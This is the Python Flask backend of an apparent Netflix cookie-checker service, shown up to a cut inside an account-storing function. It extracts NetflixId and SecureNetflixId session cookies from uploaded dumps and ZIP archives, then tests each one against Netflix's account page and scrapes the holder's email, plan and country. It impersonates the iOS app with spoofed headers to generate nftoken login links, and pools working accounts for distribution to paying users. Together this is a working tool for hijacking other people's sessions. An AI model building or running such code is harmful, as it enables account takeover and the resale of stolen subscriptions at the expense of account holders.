from flask import Flask, request, jsonify, send_from_directory, make_response, stream_with_context, Response, g, redirect
from flask_cors import CORS, cross_origin
from functools import wraps
import os
import io
import re
import json
import requests
import zipfile
import urllib.parse
import urllib3
from urllib3.exceptions import InsecureRequestWarning
import logging
import tempfile
import shutil
import uuid
import hashlib
import html
import time
from datetime import datetime, timedelta, timezone
from supabase import create_client, Client
from gotrue.errors import AuthApiError
from dotenv import load_dotenv
from deep_translator import GoogleTranslator
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_talisman import Talisman
import secrets
from marshmallow import Schema, fields, validate, ValidationError
from bs4 import BeautifulSoup
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

load_dotenv()
urllib3.disable_warnings(InsecureRequestWarning)

app = Flask(__name__)
app.secret_key = os.environ.get('FLASK_SECRET_KEY') or secrets.token_hex(32)

# Vercel-compatible limiter (memory storage acceptable for serverless)
limiter = Limiter(app=app, key_func=get_remote_address, default_limits=[])

app.config['SESSION_TYPE'] = 'filesystem'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=24)
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

# Production-ready Talisman
Talisman(app, 
    force_https=False,
    strict_transport_security=True,
    content_security_policy={
        'default-src': "'self'",
        'script-src': "'self'",
        'style-src': "'self' 'unsafe-inline'"
    }
)

# Fixed CORS - removed wildcard with credentials
ALLOWED_ORIGINS = [
    "http://localhost:3000",
    "http://localhost:5000",
    "http://localhost:8080",
    "https://hakdowken.vercel.app",
    "https://nftoken.vonezis.me"
]

CORS(app, resources={
    r"/api/*": {
        "origins": ALLOWED_ORIGINS,
        "methods": ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization", "X-Requested-With", "Accept", "Origin"],
        "supports_credentials": True,
        "max_age": 86400
    }
})

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Vercel temp directory
TEMP_DIR = "/tmp"

# Supabase configuration
SUPABASE_URL = os.environ.get('SUPABASE_URL', 'your-supabase-url')
SUPABASE_SERVICE_KEY = os.environ.get('SUPABASE_SERVICE_KEY', 'your-service-role-key')
SUPABASE_ANON_KEY = os.environ.get('SUPABASE_ANON_KEY', 'your-anon-key')
SUPER_ADMIN_EMAILS = os.environ.get('SUPER_ADMIN_EMAILS', '').split(',')
SUPER_ADMIN_IDS = os.environ.get('SUPER_ADMIN_IDS', '').split(',')

required_env = ['SUPABASE_URL', 'SUPABASE_SERVICE_KEY', 'SUPABASE_ANON_KEY']
missing = [var for var in required_env if not os.environ.get(var)]
if missing:
    logger.warning(f"Missing environment variables: {missing}")

supabase: Client = create_client(SUPABASE_URL, SUPABASE_SERVICE_KEY)

translator = GoogleTranslator(source='auto', target='en')


def create_auth_client():
    """Create a request-scoped auth client so user sessions cannot leak between requests."""
    return create_client(SUPABASE_URL, SUPABASE_ANON_KEY)


def supabase_service_headers(prefer=None):
    """Build Data API headers for legacy JWT and modern sb_secret_ keys."""
    service_key = str(SUPABASE_SERVICE_KEY or '').strip()
    headers = {
        'apikey': service_key,
        'Content-Type': 'application/json'
    }
    # Modern Supabase keys are opaque API keys, not JWTs. Sending one as a
    # bearer token can cause a 401 before PostgREST evaluates the API key.
    if service_key and not service_key.startswith('sb_'):
        headers['Authorization'] = f'Bearer {service_key}'
    if prefer:
        headers['Prefer'] = prefer
    return headers


def get_user_profile(user):
    """Return the public profile fields used by the frontend."""
    try:
        profile_response = supabase.table('user_profiles')\
            .select('*').eq('id', str(user.id)).single().execute()
        profile = profile_response.data or {}
    except Exception as exc:
        logger.warning(f"Profile lookup failed for {user.id}: {exc}")
        profile = {}

    email = user.email or ''
    is_admin = (
        email in SUPER_ADMIN_EMAILS or
        str(user.id) in SUPER_ADMIN_IDS or
        profile.get('is_super_admin', False) or
        profile.get('role') == 'super_admin'
    )

    return {
        'id': user.id,
        'email': email,
        'is_premium': profile.get('is_premium', False),
        'is_super_admin': is_admin,
        'role': 'super_admin' if is_admin else profile.get('role', 'user')
    }, profile


def serialize_session(session):
    return {
        'access_token': session.access_token,
        'refresh_token': session.refresh_token,
        'expires_at': session.expires_at
    }


DEFAULT_ADS_SUPPORTED_COUNTRIES = {
    'AU', 'BR', 'CA', 'FR', 'DE', 'IT', 'JP', 'KR', 'MX', 'ES', 'GB', 'US'
}


def get_ads_supported_countries():
    configured = os.environ.get('NETFLIX_ADS_SUPPORTED_COUNTRIES', '')
    if not configured.strip():
        return DEFAULT_ADS_SUPPORTED_COUNTRIES
    return {country.strip().upper() for country in configured.split(',') if country.strip()}


def is_ad_supported_plan(*plan_values):
    combined = ' '.join(str(value or '') for value in plan_values).lower()
    ad_free_terms = ('ad-free', 'without ads', 'sin anuncios', 'sans pub', 'senza pubblicità')
    if any(term in combined for term in ad_free_terms):
        return False
    ad_terms = (
        'with ads', 'ad-supported', 'with adverts', 'con anuncios',
        'com anúncios', 'avec pub', 'avec publicité', 'mit werbung',
        'con pubblicità', '広告つき', '광고형'
    )
    return any(term in combined for term in ad_terms)


def get_viewer_country():
    country = request.headers.get('x-vercel-ip-country', '').strip().upper()
    return country if re.fullmatch(r'[A-Z]{2}', country) else None


def get_region_compatibility(plan, subscription_type, viewer_country):
    is_ad_plan = is_ad_supported_plan(plan, subscription_type)
    compatible = (
        None if is_ad_plan and not viewer_country
        else (not is_ad_plan or viewer_country in get_ads_supported_countries())
    )
    return is_ad_plan, compatible

# =============================================================================
# ALL HELPER FUNCTIONS AND DECORATORS (DEFINED BEFORE USE)
# =============================================================================
def decode_unicode(text):
    """Decode unicode escapes like \x40 → @ and percent encoding"""
    if not text or not isinstance(text, str):
        return text
    try:
        decoded = text.encode('utf-8').decode('unicode-escape')
        decoded = urllib.parse.unquote(decoded)
        return decoded
    except:
        return text


def parse_next_billing_date(date_str):
    """Parse Netflix next billing date into ISO format and whole calendar days."""
    if not date_str or date_str == "Unknown":
        return None, None

    date_str = date_str.strip()
    formats = [
        "%B %d, %Y", "%d %B %Y", "%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%B %d"
    ]

    parsed_date = None
    for fmt in formats:
        try:
            if fmt == "%B %d" and len(date_str.split()) == 2:
                year = datetime.now().year
                parsed_date = datetime.strptime(f"{date_str} {year}", "%B %d %Y")
            else:
                parsed_date = datetime.strptime(date_str, fmt)
            break
        except:
            continue

    if not parsed_date:
        try:
            from dateutil import parser
            parsed_date = parser.parse(date_str, fuzzy=True)
        except:
            return date_str, None

    if parsed_date.tzinfo is None:
        parsed_date = parsed_date.replace(tzinfo=timezone.utc)

    today = datetime.now(timezone.utc)
    # Netflix sometimes omits the year for an upcoming renewal date. Around
    # year-end, move a date far in the past into the next calendar year.
    if not re.search(r'\b\d{4}\b', date_str):
        if parsed_date.date() < today.date() - timedelta(days=31):
            try:
                parsed_date = parsed_date.replace(year=parsed_date.year + 1)
            except ValueError:
                pass
    days_left = (parsed_date.astimezone(timezone.utc).date() - today.date()).days

    return parsed_date.date().isoformat(), days_left


def is_super_admin(user_id):
    if not user_id:
        return False
    if str(user_id) in SUPER_ADMIN_IDS:
        return True
    try:
        result = supabase.table('user_profiles')\
            .select('is_super_admin, role')\
            .eq('id', str(user_id)).single().execute()
        if result.data:
            return result.data.get('is_super_admin') or result.data.get('role') == 'super_admin'
    except Exception as e:
        logger.error(f"Super admin check error: {e}")
    return False

class CookieCheckSchema(Schema):
    content = fields.String(required=True)
    mode = fields.String(validate=validate.OneOf(['check_only', 'generate_token']), missing='check_only')


def validate_input(data):
    schema = CookieCheckSchema()
    try:
        return schema.load(data), None
    except ValidationError as err:
        return None, err.messages


def require_auth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth_header = request.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Bearer '):
            return jsonify({'status': 'error', 'message': 'Authentication required'}), 401

        token = auth_header.split(' ')[1]
        try:
            user_response = supabase.auth.get_user(token)
            if not user_response or not user_response.user:
                return jsonify({'status': 'error', 'message': 'Invalid token'}), 401
            g.user = user_response.user
            g.token = token
            return f(user_response.user, *args, **kwargs)
        except Exception as e:
            logger.error(f"Auth error: {e}")
            return jsonify({'status': 'error', 'message': 'Invalid or expired token'}), 401
    return decorated_function


def require_super_admin(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Bearer '):
            return jsonify({'status': 'error', 'message': 'Authentication required'}), 401
        token = auth_header.split(' ')[1]
        try:
            user_resp = supabase.auth.get_user(token)
            if not user_resp or not is_super_admin(user_resp.user.id):
                return jsonify({'status': 'error', 'message': 'Super admin required'}), 403
            return f(user_resp.user, *args, **kwargs)
        except Exception as e:
            logger.error(f"Super admin error: {e}")
            return jsonify({'status': 'error', 'message': 'Invalid token'}), 401
    return decorated

def ensure_ph_accounts_pool():
    """Ensure at least 8 PH premium accounts exist for super admin"""
    try:
        result = supabase.table('netflix_accounts')\
            .select('*', count='exact')\
            .eq('country', 'PH')\
            .eq('is_premium', True)\
            .eq('is_active', True)\
            .execute()
        
        current_count = result.count if hasattr(result, 'count') else len(result.data or [])
        
        if current_count < 8:
            logger.warning(f"PH accounts pool low: {current_count}/8. Super admin should add more.")
        
        return current_count
    except Exception as e:
        logger.error(f"Error checking PH accounts pool: {e}")
        return 0

def check_premium_status(user_id):
    try:
        result = supabase.table('user_profiles')\
            .select('is_premium').eq('id', user_id).single().execute()
        return result.data.get('is_premium', False) if result.data else False
    except Exception as e:
        logger.error(f"Error checking premium status: {e}")
        return False


def has_premium_access(user_id):
    """Premium features are available to paid users and super administrators."""
    return check_premium_status(user_id) or is_super_admin(user_id)

def decode_unicode(text):
    if not text or not isinstance(text, str):
        return text
    try:
        return text.encode('utf-8').decode('unicode-escape')
    except:
        return text

def translate_plan_name(plan_name):
    if not plan_name or plan_name == "Unknown":
        return "Unknown"
    
    decoded = decode_unicode(plan_name)
    cleaned = decoded.strip().lower()
    cleaned_no_spaces = cleaned.replace(' ', '').replace('-', '').replace('_', '')
    
    PLAN_TRANSLATIONS = {
        'พรีเมียม': 'Premium', 'สแตนดาร์ด': 'Standard', 'เบสิก': 'Basic', 'โมบาย': 'Mobile',
        'โฆษณา': 'Standard with Ads', 'premium': 'Premium', 'estándar': 'Standard',
        'básico': 'Basic', 'básica': 'Basic', 'móvil': 'Mobile', 'con anuncios': 'Standard with Ads',
        'padrão': 'Standard', 'com anúncios': 'Standard with Ads', 'prêmio': 'Premium',
        'essentiel': 'Basic', 'avec publicité': 'Standard with Ads', 'sans publicité': 'Standard',
        'basis': 'Basic', 'werbefrei': 'Standard', 'base': 'Basic', 'standaard': 'Standard',
        'プレミアム': 'Premium', 'スタンダード': 'Standard', 'ベーシック': 'Basic', '広告付き': 'Standard with Ads',
        '프리미엄': 'Premium', '스탠다드': 'Standard', '베이직': 'Basic', '광고 포함': 'Standard with Ads',
        '高级': 'Premium', '标准': 'Standard', '基础': 'Basic', '含广告': 'Standard with Ads', '无广告': 'Standard',
        'премиум': 'Premium', 'стандарт': 'Standard', 'базовый': 'Basic', 'с рекламой': 'Standard with Ads',
        'بريميوم': 'Premium', 'ستاندرد': 'Standard', 'أساسي': 'Basic', 'مع إعلانات': 'Standard with Ads',
        'temel': 'Basic', 'standart': 'Standard', 'reklamlı': 'Standard with Ads',
        'podstawowy': 'Basic', 'z reklamami': 'Standard with Ads',
        'standar': 'Standard', 'dasar': 'Basic', 'dengan iklan': 'Standard with Ads',
        'cao cấp': 'Premium', 'tiêu chuẩn': 'Standard', 'cơ bản': 'Basic', 'có quảng cáo': 'Standard with Ads',
    }
    
    if cleaned in PLAN_TRANSLATIONS:
        return PLAN_TRANSLATIONS[cleaned]
    
    if any(keyword in cleaned or keyword in cleaned_no_spaces for keyword in 
           ['premium', 'uhd', 'ultra', '4k', 'hdr', 'พรีเมียม', '프리미엄', 'プレミアム', '高级', 'премиум', 'بريميوم', 'cao', 'prêmio']):
        return 'Premium'
    
    if any(keyword in cleaned or keyword in cleaned_no_spaces for keyword in 
           ['standard', 'standaard', 'estándar', 'padrão', 'スタンダード', '스탠다드', '标准', 'สแตนดาร์ด', 'standart', 'tiêu']):
        return 'Standard'
    
    if any(keyword in cleaned or keyword in cleaned_no_spaces for keyword in 
           ['basic', 'basis', 'básico', 'básica', 'ベーシック', '基础', 'เบสิก', 'essentiel', 'базовый', 'أساسي', 'temel', 'podstawowy', 'dasar', 'cơ', 'base']):
        return 'Basic'
    
    if any(keyword in cleaned or keyword in cleaned_no_spaces for keyword in 
           ['mobile', 'móvil', 'móvel', 'โมบาย']):
        return 'Mobile'
    
    if any(keyword in cleaned for keyword in 
           ['ads', 'ad', 'anuncios', 'anúncios', 'publicidad', 'werbung', 'reklam', 'iklan', 'quảng cáo', 'إعلانات', 'реклама', '広告']):
        return 'Standard with Ads'
    
    return decoded.title()

# def extract_netflix_id(content):
def extract_netflix_credentials(content):
    """
    Extract both NetflixId and SecureNetflixId from cookie data.
    Returns dict with 'netflix_id' and 'secure_netflix_id' or None if invalid.
    """
    netflix_id = None
    secure_netflix_id = None
    
    # Try JSON format (cookie export extensions)
    try:
        data = json.loads(content)
        if isinstance(data, list):
            for cookie in data:
                name = cookie.get("name", "")
                if name == "NetflixId":
                    netflix_id = cookie.get("value")
                elif name == "SecureNetflixId":
                    secure_netflix_id = cookie.get("value")
        elif isinstance(data, dict):
            if "NetflixId" in data:
                netflix_id = data["NetflixId"]
            if "SecureNetflixId" in data:
                secure_netflix_id = data["SecureNetflixId"]
            if "cookies" in data:
                for cookie in data["cookies"]:
                    name = cookie.get("name", "")
                    if name == "NetflixId":
                        netflix_id = cookie.get("value")
                    elif name == "SecureNetflixId":
                        secure_netflix_id = cookie.get("value")
    except:
        pass
    
    # Try regex patterns for plain text / Netscape format
    if not netflix_id:
        netflix_id_match = re.search(r'(?<!\w)NetflixId=([^;,\s]+)', content)
        if netflix_id_match:
            netflix_id = netflix_id_match.group(1)
            if '%' in netflix_id:
                try:
                    netflix_id = urllib.parse.unquote(netflix_id)
                except:
                    pass
    
    if not secure_netflix_id:
        secure_match = re.search(r'(?<!\w)SecureNetflixId=([^;,\s]+)', content)
        if secure_match:
            secure_netflix_id = secure_match.group(1)
            if '%' in secure_netflix_id:
                try:
                    secure_netflix_id = urllib.parse.unquote(secure_netflix_id)
                except:
                    pass
    
    # Netscape format
    if not netflix_id:
        netscape_match = re.search(
            r'\.netflix\.com\s+TRUE\s+/\s+TRUE\s+\d+\s+NetflixId\s+([^\s]+)', 
            content
        )
        if netscape_match:
            netflix_id = netscape_match.group(1)
            if '%' in netflix_id:
                try:
                    netflix_id = urllib.parse.unquote(netflix_id)
                except:
                    pass
    
    if not secure_netflix_id:
        netscape_secure = re.search(
            r'\.netflix\.com\s+TRUE\s+/\s+TRUE\s+\d+\s+SecureNetflixId\s+([^\s]+)', 
            content
        )
        if netscape_secure:
            secure_netflix_id = netscape_secure.group(1)
            if '%' in secure_netflix_id:
                try:
                    secure_netflix_id = urllib.parse.unquote(secure_netflix_id)
                except:
                    pass
    
    # Plain format fallback
    if not netflix_id:
        plain_match = re.search(r'NetflixId[=:\s]+([^\s;,\n]+)', content, re.IGNORECASE)
        if plain_match:
            netflix_id = plain_match.group(1)
            if '%' in netflix_id:
                try:
                    netflix_id = urllib.parse.unquote(netflix_id)
                except:
                    pass
    
    if not secure_netflix_id:
        plain_secure = re.search(r'SecureNetflixId[=:\s]+([^\s;,\n]+)', content, re.IGNORECASE)
        if plain_secure:
            secure_netflix_id = plain_secure.group(1)
            if '%' in secure_netflix_id:
                try:
                    secure_netflix_id = urllib.parse.unquote(secure_netflix_id)
                except:
                    pass
    
    if not netflix_id:
        return None
    
    return {
        'netflix_id': netflix_id,
        'secure_netflix_id': secure_netflix_id  # Can be None, but we store it
    }

def check_netflix_cookie(cookie_dict):
    """
    Check Netflix cookie validity using BOTH NetflixId and SecureNetflixId.
    cookie_dict should contain 'NetflixId' and optionally 'SecureNetflixId'.
    """
    session = requests.Session()
    session.cookies.update(cookie_dict)

    url = 'https://www.netflix.com/YourAccount'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    try:
        resp = session.get(url, headers=headers, timeout=30)
        txt = resp.text
        txt_lower = txt.lower()

        # Check 1: Redirected to login page = invalid cookie
        if '"mode":"login"' in txt_lower:
            # Try to determine if it's because SecureNetflixId is missing
            if not cookie_dict.get('SecureNetflixId'):
                return {'ok': False, 'err': 'Invalid cookie - SecureNetflixId may be required'}
            return {'ok': False, 'err': 'Invalid cookie'}

        # Check 2: Not on account page = not logged in
        if '"mode":"yourAccount"' not in txt:
            if 'payment' in txt_lower or 'billing' in txt_lower or 'update your payment' in txt_lower:
                return {'ok': False, 'err': 'Payment required'}
            if 'membership has been canceled' in txt_lower or 'canceled' in txt_lower:
                return {'ok': False, 'err': 'Membership canceled'}
            if 'restart' in txt_lower and 'membership' in txt_lower:
                return {'ok': False, 'err': 'Membership expired - restart required'}
            if 'unauthorized' in txt_lower or 'session expired' in txt_lower:
                return {'ok': False, 'err': 'Session expired'}
            return {'ok': False, 'err': 'Not logged in'}

        # Check 3: Account page loaded but check for specific expired states
        if 'your membership is on hold' in txt_lower or 'on hold' in txt_lower:
            return {'ok': False, 'err': 'Membership on hold'}
        
        if 'please update your payment method' in txt_lower:
            return {'ok': False, 'err': 'Payment method required'}

        def find(pattern, flags=0):
            m = re.search(pattern, txt, flags)
            return m.group(1).strip() if m else "Unknown"

        # Plan extraction (your existing code)
        raw_plan = find(r'"planName"\s*:\s*"([^"]+)"')
        if raw_plan == "Unknown":
            raw_plan = find(r'localizedPlanName[^}]+"value":"([^"]+)"')
        if raw_plan == "Unknown":
            raw_plan = find(r'"currentPlanName"\s*:\s*"([^"]+)"')
        if raw_plan == "Unknown":
            raw_plan = find(r'"plan"\s*:\s*"([^"]+)"')

        # Next Billing Date (your existing code)
        next_billing_raw = find(r'"nextBillingDate"\s*:\s*"([^"]+)"')
        if next_billing_raw == "Unknown":
            next_billing_raw = find(r'data-uia="nextBillingDate-item"[^>]*>([^<]+)<')
        if next_billing_raw == "Unknown":
            next_billing_raw = find(r'Next billing date[^:]*[:]\s*([^<"]+)', re.I)
        if next_billing_raw == "Unknown":
            next_billing_raw = find(r'next payment[^:]*[:]\s*([^<"]+)', re.I)

        next_billing_str, days_left = parse_next_billing_date(next_billing_raw)

        # Check 4: Billing expired
        is_expired = False
        if days_left is not None and days_left < 0:
            is_expired = True

        # Check 5: Membership status
        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        is_valid = bool(status_match)
        is_premium = is_valid and status_match.group(1) == 'CURRENT_MEMBER'
        
        # Check 6: If membershipStatus is not CURRENT_MEMBER, it's invalid
        if status_match and status_match.group(1) != 'CURRENT_MEMBER':
            status = status_match.group(1)
            if status == 'CANCELLED':
                return {'ok': False, 'err': 'Membership cancelled'}
            elif status == 'INACTIVE':
                return {'ok': False, 'err': 'Membership inactive'}
            elif status == 'HOLD':
                return {'ok': False, 'err': 'Membership on hold'}
            else:
                return {'ok': False, 'err': f'Membership status: {status}'}

        # Check 7: If no membership status found at all
        if not is_valid:
            return {'ok': False, 'err': 'No membership status found'}

        plan = translate_plan_name(raw_plan)

        signup_country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"')
        current_country = find(r'"currentCountry"\s*:\s*"([^"]+)"')
        membership_country = find(r'"country"\s*:\s*"([^"]+)"')
        
        locale = find(r'"locale"\s*:\s*"([^"]+)"')
        locale_country = locale.split('_')[0].upper() if locale and '_' in locale else None
        if not locale_country and locale and len(locale) == 2:
            locale_country = locale.upper()
        
        currency = find(r'"currency"\s*:\s*"([^"]+)"')
        currency_map = {
            'PHP': 'PH', 'USD': 'US', 'EUR': 'EU', 'GBP': 'GB', 'JPY': 'JP',
            'KRW': 'KR', 'THB': 'TH', 'IDR': 'ID', 'MYR': 'MY', 'SGD': 'SG',
            'AUD': 'AU', 'CAD': 'CA', 'MXN': 'MX', 'BRL': 'BR', 'ARS': 'AR',
            'CLP': 'CL', 'COP': 'CO', 'PEN': 'PE', 'CHF': 'CH', 'SEK': 'SE',
            'NOK': 'NO', 'DKK': 'DK', 'PLN': 'PL', 'CZK': 'CZ', 'HUF': 'HU',
            'RON': 'RO', 'BGN': 'BG', 'HRK': 'HR', 'TRY': 'TR', 'ILS': 'IL',
            'AED': 'AE', 'SAR': 'SA', 'ZAR': 'ZA', 'INR': 'IN', 'PKR': 'PK',
            'BDT': 'BD', 'LKR': 'LK', 'NPR': 'NP', 'MMK': 'MM', 'VND': 'VN',
            'TWD': 'TW', 'HKD': 'HK', 'CNY': 'CN', 'RUB': 'RU', 'UAH': 'UA',
            'KZT': 'KZ', 'EGP': 'EG', 'NGN': 'NG', 'KES': 'KE', 'GHS': 'GH'
        }
        currency_country = currency_map.get(currency, None)
        
        detected_country = None
        
        # [Keep all your existing country detection logic...]
        if '"es-ES"' in txt or 'es_ES' in txt or 'España' in txt:
            detected_country = 'ES'
        elif '"es-' in txt or 'espanol' in txt_lower or 'español' in txt_lower:
            detected_country = 'MX'
        elif '"pt-BR"' in txt or 'pt_BR' in txt or 'Brasil' in txt:
            detected_country = 'BR'
        # ... etc (keep all existing country detection) ...
        elif '"en-US"' in txt or 'en_US' in txt:
            detected_country = 'US'
        elif '"en-' in txt:
            detected_country = 'US'
        
        country = (
            current_country if current_country != "Unknown" else
            detected_country if detected_country else
            membership_country if membership_country != "Unknown" else
            signup_country if signup_country != "Unknown" else
            locale_country if locale_country else
            currency_country if currency_country else
            "Unknown"
        )

        email = find(r'"emailAddress"\s*:\s*"([^"]+)"')
        if email != "Unknown":
            email = urllib.parse.unquote(email)

        subscription_type = "Standard"
        plan_lower = plan.lower()

        if "premium" in plan_lower:
            subscription_type = "Premium"
        elif "standard" in plan_lower:
            subscription_type = "Standard"
        elif "basic" in plan_lower:
            subscription_type = "Basic"
        elif "mobile" in plan_lower:
            subscription_type = "Mobile"
        
        if plan == "Unknown" and is_premium:
            if any(indicator in txt_lower for indicator in ['"isuhdavailable":true', '"uhd":true', '"hdr":true', '"4k":true']):
                plan = "Premium (UHD)"
                subscription_type = "Premium"
            elif '"maxstreams":4' in txt_lower:
                plan = "Premium (4 screens)"
                subscription_type = "Premium"
            elif '"maxstreams":2' in txt_lower:
                plan = "Standard (2 screens)"
                subscription_type = "Standard"

        return {
            'ok': is_valid and is_premium and not is_expired,
            'err': (
                f'Renewal date has passed: {next_billing_str}'
                if is_expired else None
            ),
            'premium': is_premium,
            'email': email,
            'country': country,
            'signup_country': signup_country if signup_country != "Unknown" else country,
            'plan': plan,
            'subscription_type': subscription_type,
            'detection_method': (
                'current_ip' if current_country != "Unknown" else
                'content_language' if detected_country else
                'membership' if membership_country != "Unknown" else
                'signup' if signup_country != "Unknown" else
                'locale' if locale_country else
                'currency' if currency_country else
                'unknown'
            ),
            'next_billing_date': next_billing_str,
            'days_until_billing': days_left,
            'is_expired': is_expired,
            'has_secure_id': bool(cookie_dict.get('SecureNetflixId'))  # New field
        }
        
    except Exception as e:
        logger.error(f"Error checking cookie: {str(e)}")
        return {'ok': False, 'err': str(e)}

def generate_token(netflix_id, secure_netflix_id=None):
    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    
    params = {
        'appVersion': "15.48.1",
        'config': '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        'device_type': "NFAPPL-02-",
        'esn': "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'idiom': "phone",
        'iosVersion': "15.8.5",
        'isTablet': "false",
        'languages': "en-US",
        'locale': "en-US",
        'maxDeviceWidth': "375",
        'model': "saget",
        'modelType': "IPHONE8-1",
        'odpAware': "true",
        'path': '["account","token","default"]',
        'pathFormat': "graph",
        'pixelDensity': "2.0",
        'progressive': "false",
        'responseFormat': "json"
    }

    cookie_header = f"NetflixId={netflix_id}"
    if secure_netflix_id:
        cookie_header += f"; SecureNetflixId={secure_netflix_id}"

    headers = {
        'User-Agent': "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        'x-netflix.request.attempt': "1",
        'x-netflix.request.client.user.guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.context.profile-guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        'x-netflix.context.app-version': "15.48.1",
        'x-netflix.argo.translated': "true",
        'x-netflix.context.form-factor': "phone",
        'x-netflix.context.sdk-version': "2012.4",
        'x-netflix.client.appversion': "15.48.1",
        'x-netflix.context.max-device-width': "375",
        'x-netflix.context.ab-tests': "",
        'x-netflix.tracing.cl.useractionid': "4DC655F2-9C3C-4343-8229-CA1B003C3053",
        'x-netflix.client.type': "argo",
        'x-netflix.client.ftl.esn': "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'x-netflix.context.locales': "en-US",
        'x-netflix.context.top-level-uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        'x-netflix.client.iosversion': "15.8.5",
        'accept-language': "en-US;q=1",
        'x-netflix.argo.abtests': "",
        'x-netflix.context.os-version': "15.8.5",
        'x-netflix.request.client.context': '{"appState":"foreground"}',
        'x-netflix.context.ui-flavor': "argo",
        'x-netflix.argo.nfnsm': "9",
        'x-netflix.context.pixel-density': "2.0",
        'x-netflix.request.toplevel.uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        'x-netflix.request.client.timezoneid': "Asia/Dhaka",
        'Cookie': cookie_header
    }

    try:
        response = requests.get(url, params=params, headers=headers, timeout=30, verify=False)
        data = response.json()
        
        if "value" in data and data["value"] and "account" in data["value"]:
            token_data = data["value"]["account"]["token"]["default"]
            token = token_data["token"]
            expires = token_data["expires"]
            
            if len(str(expires)) == 13:
                expires //= 1000
            
            login_urls = {
                "phone": f"https://netflix.com/unsupported?nftoken={token}",
                "tv": f"https://netflix.com/tv8?nftoken={token}",
                "pc": f"https://netflix.com/browse?nftoken={token}"
            }
            
            return {
                "status": "Success",
                "token": token,
                "expires": expires,
                "login_urls": login_urls
            }
        return {"status": "Failure", "error": "No token"}
    except Exception as e:
        return {"status": "Error", "error": str(e)}

def extract_zip_and_get_files(zip_path, extract_dir):
    txt_files = []
    try:
        extract_dir = os.path.join(TEMP_DIR, os.path.basename(extract_dir))
        os.makedirs(extract_dir, exist_ok=True)
        
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.lower().endswith('.txt'):
                    txt_files.append(os.path.join(root, file))
        return txt_files
    except Exception as e:
        logger.error(f"Error extracting ZIP: {e}")
        return []

def store_netflix_account(email, netflix_id, secure_netflix_id, subscription_type, country, plan,
                         cookie_content, user_id, signup_country=None,
                         detection_method=None, is_exclusive=False,
                         reserved_for_admin=False, next_billing_date=None,
                         days_until_billing=None, is_expired=False):
    """Store account with BOTH NetflixId and SecureNetflixId"""
    try:
        clean_email = decode_unicode(email)

        # Skip clearly expired accounts
        if is_expired and days_until_billing is not None and days_until_billing < 0:
            logger.warning(f"Skipping expired account: {clean_email} ({days_until_billing} days)")
            return False, None

        adding_user_is_admin = is_super_admin(user_id)

        account_data = {
            'email': clean_email,
            'netflix_id': netflix_id,
            'secure_netflix_id': secure_netflix_id,  # NEW FIELD
            'subscription_type': subscription_type,
            'country': country,
            'signup_country': signup_country or country,
            'plan': plan,
            'is_premium': True,
            'cookie_data': cookie_content[:500] if cookie_content else None,
            'added_by': str(user_id),
            'last_checked': datetime.utcnow().isoformat(),
            'is_active': True,
            'detection_method': detection_method,
            'exclusive_access': is_exclusive if adding_user_is_admin else False,
            'reserved_for_super_admin': reserved_for_admin if adding_user_is_admin else False,
            'next_billing_date': next_billing_date,
            'days_until_billing': days_until_billing,
            'is_expired': is_expired
        }

        headers = supabase_service_headers(
            'return=representation,resolution=merge-duplicates'
        )

        check_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?select=id&email=eq.{urllib.parse.quote(clean_email)}"
        check_resp = requests.get(check_url, headers=headers, timeout=30)

        if check_resp.status_code == 200 and check_resp.json():
            account_id = check_resp.json()[0]['id']
            update_url = f"{SUPABASE_URL}/rest/v1/netflix_accounts?id=eq.{account_id}"
